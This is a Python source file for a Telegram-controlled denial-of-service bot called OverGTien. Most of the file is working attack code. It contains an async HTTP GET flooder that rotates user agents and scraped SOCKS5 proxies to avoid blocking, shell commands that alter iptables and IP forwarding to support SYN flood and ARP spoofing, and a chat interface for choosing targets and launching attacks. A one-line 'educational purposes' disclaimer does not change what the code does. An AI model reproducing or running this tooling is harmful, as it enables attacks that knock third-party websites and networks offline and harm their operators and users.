#!/usr/bin/env python3
"""OverGTien DoS Bot - Telegram Bot Edition with Async aiohttp."""

# -*- coding: utf-8 -*-
from __future__ import annotations

import asyncio
import ipaddress
import json
import logging
import os
import random
import re
import signal
import socket
import sys
import warnings
from datetime import datetime, timedelta
from functools import cache, wraps
from threading import Thread, Event
from time import sleep, time
from typing import Dict, Iterator, List, Optional, Tuple, Union
from urllib.parse import urlparse

import aiohttp
import requests
import socks
from aiohttp import ClientSession, ClientTimeout, TCPConnector
from colorama import Fore as F, init
from requests.exceptions import ConnectionError as ReqConnectionError
from requests.exceptions import InvalidURL, ReadTimeout, Timeout as ReqTimeout
from scapy.all import srp
from scapy.layers.l2 import ARP, Ether
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)
from telegram.constants import ParseMode

# Khởi tạo colorama
init(autoreset=True)

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# ============================================
# CONFIGURATION
# ============================================

VERSION = "3.0.0"
DEBUG = False

# Bot Token - Lấy từ @BotFather
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")

# Admin ID - Lấy từ @userinfobot
ADMIN_IDS = [
    int(os.environ.get("ADMIN_ID", "0")),
]

# Logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger("OverGTien")

# Conversation states
(METHOD, TARGET, THREADS, DURATION, SLEEP_TIME, CONFIRM) = range(6)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

HEADERS = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}

VALID_METHODS = [
    "http", "http-proxy", "slowloris", "slowloris-proxy",
    "syn-flood", "arp-spoof", "disconnect"
]

LAYER_2_3_METHODS = ["syn-flood", "arp-spoof", "disconnect"]

# Global attack tracking
active_attacks: Dict[int, AttackMethod] = {}
attack_tasks: Dict[int, asyncio.Task] = {}

# Statistics
stats = {
    "requests_sent": 0,
    "success_count": 0,
    "blocked_count": 0,
    "error_count": 0,
    "start_time": None,
    "bytes_sent": 0,
}

shutdown_event = Event()


# ============================================
# DECORATORS
# ============================================

def admin_only(func):
    """Decorator to restrict commands to admin only."""
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("🚫 Bạn không có quyền sử dụng bot này!")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


def send_typing(func):
    """Decorator to show typing action."""
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        await context.bot.send_chat_action(
            chat_id=update.effective_chat.id,
            action="typing"
        )
        return await func(update, context, *args, **kwargs)
    return wrapper


# ============================================
# UTILITY FUNCTIONS
# ============================================

def debug_print(msg: str) -> None:
    """Print debug messages."""
    if DEBUG:
        logger.debug(msg)


def format_duration(seconds: int) -> str:
    """Format duration to human readable."""
    if seconds < 60:
        return f"{seconds}s"
    elif seconds < 3600:
        return f"{seconds // 60}m {seconds % 60}s"
    else:
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        return f"{hours}h {minutes}m"


def get_progress_bar(percent: float, length: int = 10) -> str:
    """Create progress bar string."""
    filled = int(length * percent / 100)
    bar = "█" * filled + "░" * (length - filled)
    return f"[{bar}] {percent:.1f}%"


# ============================================
# IP TOOLS
# ============================================

@cache
def get_host_ip() -> str:
    """Get host's IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        return "Unknown"
    finally:
        s.close()
    return ip


def set_target_http(target: str) -> str:
    """Add HTTP protocol if missing."""
    if not target.startswith("http"):
        target = f"http://{target}"
    return target


def get_target_domain(target: str) -> Tuple[str, int]:
    """Extract domain and port from URL."""
    parsed_uri = urlparse(set_target_http(target))
    try:
        domain, port = parsed_uri.netloc.split(":")
    except ValueError:
        domain, port = parsed_uri.netloc, 80
    return domain, int(port)


def check_internet() -> bool:
    """Check internet connectivity."""
    test_urls = ["https://google.com", "https://cloudflare.com", "https://github.com"]
    for url in test_urls:
        try:
            response = requests.get(url, timeout=3)
            if response.status_code == 200:
                return True
        except Exception:
            continue
    return False


def get_socks_proxies() -> List[Dict[str, str]]:
    """Fetch SOCKS5 proxies."""
    try:
        response = requests.get(
            "https://api.proxyscrape.com/v2/?request=displayproxies"
            "&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
            verify=False,
            timeout=10,
        )
        proxies = []
        for proxy in response.text.split("\r\n"):
            if proxy and ":" in proxy:
                addr, port = proxy.split(":")
                proxies.append({"addr": addr, "port": port})
        return proxies
    except Exception:
        return []


# ============================================
# ASYNC FLOODER
# ============================================

class AsyncFlooder:
    """Async HTTP flooder using aiohttp."""
    
    def __init__(self, target: str, method: str, proxies: Optional[List[Dict[str, str]]] = None):
        self.target = target
        self.method = method
        self.proxies = proxies or []
        self.session: Optional[ClientSession] = None
        self._lock = asyncio.Lock()
    
    async def create_session(self) -> None:
        """Create aiohttp session."""
        connector = TCPConnector(
            limit=0,
            force_close=True,
            enable_cleanup_closed=True,
        )
        timeout = ClientTimeout(total=10, connect=5)
        self.session = ClientSession(
            connector=connector,
            timeout=timeout,
            headers=HEADERS,
        )
    
    async def close_session(self) -> None:
        """Close session."""
        if self.session and not self.session.closed:
            await self.session.close()
    
    async def flood_direct(self) -> Dict:
        """HTTP GET flood directly."""
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        result = {"status": "error", "size": 0}
        
        try:
            async with self.session.get(
                self.target,
                headers=headers,
                ssl=False,
                allow_redirects=True,
            ) as response:
                content = await response.read()
                status = response.status
                
                async with self._lock:
                    stats["requests_sent"] += 1
                    stats["bytes_sent"] += len(content)
                    
                    if status == 200:
                        stats["success_count"] += 1
                    elif status == 403:
                        stats["blocked_count"] += 1
                    elif status >= 500:
                        stats["error_count"] += 1
                
                result = {"status": status, "size": len(content)}
        except Exception:
            async with self._lock:
                stats["error_count"] += 1
                stats["requests_sent"] += 1
        
        return result
    
    async def flood_proxy(self) -> Dict:
        """HTTP GET flood through proxy."""
        if not self.proxies:
            return await self.flood_direct()
        
        proxy = random.choice(self.proxies)
        proxy_url = f"http://{proxy['addr']}:{proxy['port']}"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        result = {"status": "error", "size": 0, "proxy": f"{proxy['addr']}:{proxy['port']}"}
        
        try:
            async with self.session.get(
                self.target,
                headers=headers,
                proxy=proxy_url,
                ssl=False,
                allow_redirects=True,
            ) as response:
                content = await response.read()
                status = response.status
                
                async with self._lock:
                    stats["requests_sent"] += 1
                    stats["bytes_sent"] += len(content)
                    
                    if status == 200:
                        stats["success_count"] += 1
                    elif status == 403:
                        stats["blocked_count"] += 1
                        try:
                            self.proxies.remove(proxy)
                        except ValueError:
                            pass
                    elif status >= 500:
                        stats["error_count"] += 1
                
                result = {"status": status, "size": len(content)}
        except Exception:
            async with self._lock:
                stats["error_count"] += 1
                stats["requests_sent"] += 1
        
        return result
    
    async def worker(self) -> None:
        """Worker coroutine."""
        while not shutdown_event.is_set():
            if "proxy" in self.method:
                await self.flood_proxy()
            else:
                await self.flood_direct()
            await asyncio.sleep(0)
    
    async def start_flood(self, concurrency: int) -> None:
        """Start async flood."""
        await self.create_session()
        
        tasks = [
            asyncio.create_task(self.worker())
            for _ in range(concurrency)
        ]
        
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass
        finally:
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            await self.close_session()


# ============================================
# ATTACK METHOD CLASS
# ============================================

class AttackMethod:
    """Control the attack's inner operations."""
    
    def __init__(
        self,
        method_name: str,
        duration: int,
        threads: int,
        target: str,
        sleep_time: int = 15,
        chat_id: Optional[int] = None,
        bot_context: Optional[ContextTypes.DEFAULT_TYPE] = None,
    ):
        self.method_name = method_name
        self.duration = duration
        self.threads_count = threads
        self.target = target
        self.sleep_time = sleep_time
        self.chat_id = chat_id
        self.bot_context = bot_context
        self.threads: List[Thread] = []
        self.is_running = False
        self.proxies: Optional[List[Dict[str, str]]] = None
        self.sockets: List[socket.socket] = []
        self.start_time = None
        self.status_message_id = None
        
        # Reset stats
        stats["start_time"] = time()
        stats["requests_sent"] = 0
        stats["success_count"] = 0
        stats["blocked_count"] = 0
        stats["error_count"] = 0
        stats["bytes_sent"] = 0
    
    def __enter__(self) -> AttackMethod:
        """Setup attack resources."""
        if self.method_name in ["arp-spoof", "disconnect"]:
            if self.method_name == "arp-spoof":
                os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
        elif self.method_name == "syn-flood":
            os.system(
                f"sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST "
                f"-s {get_host_ip()} -j DROP"
            )
        else:
            self.target = set_target_http(self.target)
            
            if "proxy" in self.method_name:
                self.proxies = get_socks_proxies()
        
        return self
    
    def __exit__(self, exc_type, exc_value, traceback) -> None:
        """Cleanup resources."""
        if self.method_name == "syn-flood":
            os.system(
                f"sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST "
                f"-s {get_host_ip()} -j DROP"
            )
        elif self.method_name == "arp-spoof":
            os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1")
        
        for sock in self.sockets:
            try:
                sock.close()
            except Exception:
                pass
    
    async def send_status_update(self, text: str, reply_markup=None) -> None:
        """Send or update status message in Telegram."""
        if not self.bot_context or not self.chat_id:
            return
        
        try:
            if self.status_message_id:
                await self.bot_context.bot.edit_message_text(
                    chat_id=self.chat_id,
                    message_id=self.status_message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=reply_markup,
                )
            else:
                msg = await self.bot_context.bot.send_message(
                    chat_id=self.chat_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=reply_markup,
                )
                self.status_message_id = msg.message_id
        except Exception as e:
            logger.error(f"Error sending status: {e}")
    
    def get_stats_text(self) -> str:
        """Get formatted stats text."""
        if not stats["start_time"]:
            return "No stats available"
        
        elapsed = time() - stats["start_time"]
        rps = stats["requests_sent"] / elapsed if elapsed > 0 else 0
        remaining = max(0, self.duration - elapsed)
        percent = min(100, (elapsed / self.duration) * 100)
        
        return f"""
<b>⚔️ OverGTien ATTACK STATUS</b>

🎯 <b>Target:</b> <code>{self.target}</code>
🔧 <b>Method:</b> <code>{self.method_name.upper()}</code>
⏱️ <b>Elapsed:</b> {format_duration(int(elapsed))}
⏳ <b>Remaining:</b> {format_duration(int(remaining))}

{get_progress_bar(percent)}

📤 <b>Requests:</b> {stats['requests_sent']:,}
✅ <b>Success (200):</b> {stats['success_count']:,}
🚫 <b>Blocked (403):</b> {stats['blocked_count']:,}
❌ <b>Errors:</b> {stats['error_count']:,}
📦 <b>Data Sent:</b> {stats['bytes_sent']/1024/1024:.2f} MB
⚡ <b>Requests/s:</b> {rps:.1f}
📈 <b>Success Rate:</b> {(stats['success_count']/max(1,stats['requests_sent'])*100):.1f}%
"""
    
    async def _run_timer_async(self) -> None:
        """Async timer with Telegram updates."""
        self.start_time = time()
        last_update = self.start_time
        
        while self.is_running and not shutdown_event.is_set():
            current_time = time()
            elapsed = current_time - self.start_time
            
            if elapsed >= self.duration:
                self.is_running = False
                shutdown_event.set()
                break
            
            if current_time - last_update >= 3:
                try:
                    keyboard = [[InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")]]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    await self.send_status_update(
                        self.get_stats_text(),
                        reply_markup=reply_markup
                    )
                except Exception:
                    pass
                last_update = current_time
            
            await asyncio.sleep(1)
    
    async def _run_async_flood(self) -> None:
        """Run async flood."""
        flooder = AsyncFlooder(
            target=self.target,
            method=self.method_name,
            proxies=self.proxies,
        )
        await flooder.start_flood(concurrency=self.threads_count)
    
    async def start_async(self) -> None:
        """Start attack with async support."""
        global shutdown_event
        shutdown_event.clear()
        
        self.is_running = True
        
        await self.send_status_update(
            f"🚀 <b>OverGTien Starting Attack...</b>\n\n"
            f"🎯 Target: {self.target}\n"
            f"🔧 Method: {self.method_name.upper()}\n"
            f"⏱️ Duration: {format_duration(self.duration)}\n"
            f"🧵 Workers: {self.threads_count}",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")
            ]])
        )
        
        try:
            await asyncio.gather(
                self._run_timer_async(),
                self._run_async_flood(),
            )
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"Attack error: {e}")
        finally:
            self.is_running = False
            shutdown_event.set()
            
            final_text = self.get_stats_text() + "\n\n✅ <b>ATTACK COMPLETED!</b>"
            await self.send_status_update(final_text)


# ============================================
# TELEGRAM BOT HANDLERS
# ============================================

@admin_only
@send_typing
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /start command."""
    keyboard = [
        [InlineKeyboardButton("⚔️ New Attack", callback_data="new_attack")],
        [InlineKeyboardButton("📊 System Info", callback_data="sys_info")],
        [InlineKeyboardButton("🛑 Stop All", callback_data="stop_all")],
        [InlineKeyboardButton("❓ Help", callback_data="help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"<b>⚡ OverGTien DoS Bot v{VERSION}</b>\n\n"
        f"Welcome, {update.effective_user.first_name}!\n"
        f"Power meets Simplicity.\n\n"
        f"Select an option below:",
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML,
    )


@admin_only
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /help command."""
    help_text = f"""
<b>📚 OverGTien DoS Bot v{VERSION}</b>

<b>Commands:</b>
/start - Main menu
/attack - Start new attack
/stop - Stop all attacks
/status - Current attack status
/info - System information

<b>Attack Methods:</b>
• <code>http</code> - HTTP GET flood
• <code>http-proxy</code> - HTTP flood qua SOCKS5
• <code>slowloris</code> - Connection keep-alive
• <code>slowloris-proxy</code> - Slowloris qua proxy
• <code>syn-flood</code> - TCP SYN flood (root)
• <code>arp-spoof</code> - ARP spoofing (root)
• <code>disconnect</code> - Network disconnect (root)

<b>Usage:</b>
1. Click "New Attack" or use /attack
2. Select method
3. Enter target URL
4. Configure settings
5. Confirm and launch!

<i>⚠️ For educational purposes only!</i>
"""
    await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)


@admin_only
@send_typing
async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /info command."""
    host_ip = get_host_ip()
    internet = "✅ Connected" if check_internet() else "❌ No connection"
    python_ver = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
    
    info_text = f"""
<b>📊 OverGTien SYSTEM INFORMATION</b>

🖥️ <b>Host IP:</b> <code>{host_ip}</code>
🐍 <b>Python:</b> <code>{python_ver}</code>
🌐 <b>Internet:</b> {internet}
⚡ <b>Active Attacks:</b> {len(active_attacks)}

<b>Modules:</b>
• aiohttp: ✅
• requests: ✅
• scapy: ✅
• PySocks: ✅

<i>OverGTien - Power meets Simplicity</i>
"""
    await update.message.reply_text(info_text, parse_mode=ParseMode.HTML)


@admin_only
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start attack conversation."""
    keyboard = []
    for i, method in enumerate(VALID_METHODS):
        if i % 2 == 0:
            keyboard.append([])
        keyboard[-1].append(InlineKeyboardButton(method.upper(), callback_data=f"method_{method}"))
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "<b>⚔️ SELECT ATTACK METHOD:</b>",
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML,
    )
    return METHOD


async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle method selection."""
    query = update.callback_query
    await query.answer()
    
    method = query.data.replace("method_", "")
    context.user_data["method"] = method
    
    if method in LAYER_2_3_METHODS:
        if os.name == "nt":
            await query.edit_message_text("❌ Method này không hỗ trợ Windows!")
            return ConversationHandler.END
        try:
            if os.getuid() != 0:
                await query.edit_message_text(
                    "⚠️ Method này cần quyền ROOT!\n"
                    "Vui lòng chạy bot với sudo."
                )
                return ConversationHandler.END
        except AttributeError:
            pass
    
    await query.edit_message_text(
        f"<b>Method selected:</b> <code>{method.upper()}</code>\n\n"
        f"<b>Enter target URL/IP:</b>",
        parse_mode=ParseMode.HTML,
    )
    return TARGET


async def target_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle target input."""
    target = update.message.text.strip()
    context.user_data["target"] = set_target_http(target)
    
    method = context.user_data["method"]
    
    if method in ["arp-spoof", "disconnect"]:
        threads = 1
    else:
        await update.message.reply_text(
            f"<b>Target:</b> <code>{context.user_data['target']}</code>\n\n"
            f"<b>Enter number of threads/workers (default: 100):</b>",
            parse_mode=ParseMode.HTML,
        )
        return THREADS
    
    context.user_data["threads"] = threads
    
    await update.message.reply_text(
        f"<b>Target:</b> <code>{context.user_data['target']}</code>\n"
        f"<b>Threads:</b> {threads}\n\n"
        f"<b>Enter duration in seconds (default: 60):</b>",
        parse_mode=ParseMode.HTML,
    )
    return DURATION


async def threads_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle threads input."""
    try:
        threads = int(update.message.text.strip())
        if threads < 1:
            raise ValueError
        context.user_data["threads"] = min(threads, 1000)
    except ValueError:
        context.user_data["threads"] = 100
    
    await update.message.reply_text(
        f"<b>Threads:</b> {context.user_data['threads']}\n\n"
        f"<b>Enter duration in seconds (default: 60):</b>",
        parse_mode=ParseMode.HTML,
    )
    return DURATION


async def duration_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle duration input."""
    try:
        duration = int(update.message.text.strip())
        if duration < 1:
            raise ValueError
        context.user_data["duration"] = min(duration, 3600)
    except ValueError:
        context.user_data["duration"] = 60
    
    method = context.user_data["method"]
    
    if "slowloris" in method:
        await update.message.reply_text(
            f"<b>Duration:</b> {context.user_data['duration']}s\n\n"
            f"<b>Enter sleep time in seconds (default: 15):</b>",
            parse_mode=ParseMode.HTML,
        )
        return SLEEP_TIME
    
    return await show_confirmation(update, context)


async def sleep_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle sleep time input."""
    try:
        sleep_time = int(update.message.text.strip())
        if sleep_time < 1:
            raise ValueError
        context.user_data["sleep_time"] = sleep_time
    except ValueError:
        context.user_data["sleep_time"] = 15
    
    return await show_confirmation(update, context)


async def show_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show attack confirmation."""
    user_data = context.user_data
    sleep_str = f"\n💤 <b>Sleep Time:</b> {user_data.get('sleep_time', 15)}s" if "slowloris" in user_data.get("method", "") else ""
    
    confirm_text = f"""
<b>⚔️ OverGTien ATTACK CONFIRMATION</b>

🎯 <b>Target:</b> <code>{user_data['target']}</code>
🔧 <b>Method:</b> <code>{user_data['method'].upper()}</code>
🧵 <b>Threads:</b> {user_data.get('threads', 1)}
⏱️ <b>Duration:</b> {format_duration(user_data['duration'])}{sleep_str}

<b>Launch attack?</b>
"""
    keyboard = [
        [
            InlineKeyboardButton("✅ LAUNCH", callback_data="confirm_yes"),
            InlineKeyboardButton("❌ CANCEL", callback_data="confirm_no"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            confirm_text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup,
        )
    else:
        await update.message.reply_text(
            confirm_text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup,
        )
    
    return CONFIRM


async def confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle attack confirmation."""
    query = update.callback_query
    await query.answer()
    
    if query.data == "confirm_no":
        await query.edit_message_text("❌ Attack cancelled.")
        return ConversationHandler.END
    
    user_data = context.user_data
    
    attack = AttackMethod(
        method_name=user_data["method"],
        duration=user_data["duration"],
        threads=user_data.get("threads", 100),
        target=user_data["target"],
        sleep_time=user_data.get("sleep_time", 15),
        chat_id=query.message.chat_id,
        bot_context=context,
    )
    
    attack.__enter__()
    
    active_attacks[query.message.chat_id] = attack
    
    await query.edit_message_text(
        f"🚀 <b>OverGTien LAUNCHING ATTACK!</b>\n\n"
        f"🎯 {user_data['target']}\n"
        f"🔧 {user_data['method'].upper()}\n"
        f"⏱️ {format_duration(user_data['duration'])}",
        parse_mode=ParseMode.HTML,
    )
    
    task = asyncio.create_task(attack.start_async())
    attack_tasks[query.message.chat_id] = task
    
    return ConversationHandler.END


@admin_only
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /stop command."""
    chat_id = update.effective_chat.id
    
    if chat_id in active_attacks:
        attack = active_attacks[chat_id]
        attack.is_running = False
        shutdown_event.set()
        
        if chat_id in attack_tasks:
            attack_tasks[chat_id].cancel()
        
        del active_attacks[chat_id]
        
        await update.message.reply_text("🛑 OverGTien Attack stopped!")
    else:
        await update.message.reply_text("No active attack to stop.")


@admin_only
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /status command."""
    chat_id = update.effective_chat.id
    
    if chat_id in active_attacks:
        attack = active_attacks[chat_id]
        keyboard = [[InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            attack.get_stats_text(),
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup,
        )
    else:
        await update.message.reply_text("No active attack.")


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button callbacks."""
    query = update.callback_query
    await query.answer()
    
    if query.data == "new_attack":
        return await attack_command(update, context)
    
    elif query.data == "sys_info":
        return await info_command(update, context)
    
    elif query.data == "stop_all":
        for attack in active_attacks.values():
            attack.is_running = False
        shutdown_event.set()
        
        for task in attack_tasks.values():
            task.cancel()
        
        active_attacks.clear()
        attack_tasks.clear()
        
        await query.edit_message_text("🛑 All OverGTien attacks stopped!")
    
    elif query.data == "stop_attack":
        chat_id = query.message.chat_id
        if chat_id in active_attacks:
            active_attacks[chat_id].is_running = False
            shutdown_event.set()
            
            if chat_id in attack_tasks:
                attack_tasks[chat_id].cancel()
            
            del active_attacks[chat_id]
            await query.edit_message_text("🛑 Attack stopped!")
    
    elif query.data == "help":
        help_text = """
<b>📚 OverGTien DoS Bot</b>

<b>Methods:</b>
• http - HTTP GET flood
• http-proxy - HTTP qua SOCKS5
• slowloris - Keep-alive attack
• syn-flood - TCP SYN (root)
• arp-spoof - ARP spoof (root)

<b>Commands:</b>
/start - Main menu
/attack - New attack
/stop - Stop attacks
/status - Attack status
/info - System info

<i>OverGTien - Power meets Simplicity</i>
"""
        await query.edit_message_text(help_text, parse_mode=ParseMode.HTML)
    
    elif query.data.startswith("method_"):
        return await method_callback(update, context)
    
    elif query.data.startswith("confirm_"):
        return await confirm_callback(update, context)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel conversation."""
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END


# ============================================
# MAIN
# ============================================

def show_logo() -> None:
    """Display OverGTien logo."""
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{F.RED}
╔══════════════════════════════════════════════════╗
║         OverGTien DoS Bot v{VERSION}                ║
║        Async aiohttp Telegram Edition            ║
║            Power meets Simplicity                ║
║            by 7zx, 8fn and João                 ║
╚══════════════════════════════════════════════════╝{F.RESET}
""")


def main() -> None:
    """Start OverGTien bot."""
    show_logo()
    
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print(f"{F.RED}[!] Please set your BOT_TOKEN!{F.RESET}")
        print(f"{F.YELLOW}export BOT_TOKEN='your_token_here'{F.RESET}")
        print(f"{F.YELLOW}export ADMIN_ID='your_telegram_id'{F.RESET}")
        sys.exit(1)
    
    if ADMIN_IDS == [0]:
        print(f"{F.YELLOW}[!] Please set ADMIN_ID for security!{F.RESET}")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("attack", attack_command),
            CallbackQueryHandler(button_handler, pattern="^new_attack$"),
        ],
        states={
            METHOD: [CallbackQueryHandler(method_callback, pattern="^method_")],
            TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, target_input)],
            THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, threads_input)],
            DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, duration_input)],
            SLEEP_TIME: [MessageHandler(filters.TEXT & ~filters.COMMAND, sleep_input)],
            CONFIRM: [CallbackQueryHandler(confirm_callback, pattern="^confirm_")],
        },
        fallbacks=[CommandHandler("cancel", cancel_command)],
    )
    
    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("info", info_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print(f"{F.GREEN}[✓] OverGTien Bot is running...{F.RESET}")
    print(f"{F.CYAN}[*] Press Ctrl+C to stop{F.RESET}")
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{F.RED}[!] OverGTien Bot stopped.{F.RESET}")
        sys.exit(0)
